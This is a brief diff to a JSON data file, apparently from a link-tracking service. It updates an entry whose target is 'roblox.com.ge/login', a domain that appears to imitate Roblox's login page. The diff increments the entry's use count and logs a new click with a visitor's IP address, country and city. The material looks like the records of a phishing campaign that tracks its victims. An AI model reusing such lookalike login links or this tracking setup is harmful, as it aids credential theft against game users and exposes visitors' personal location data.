@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1481,
+    "useCount": 1482,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12016,6 +12016,14 @@
         "city": "Lviv",
         "flag": "🇺🇦",
         "countryCode": "UA"
+      },
+      {
+        "timestamp": 1777439011172,
+        "ip": "119.93.172.144",
+        "country": "Philippines",
+        "city": "City of Muntinlupa",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
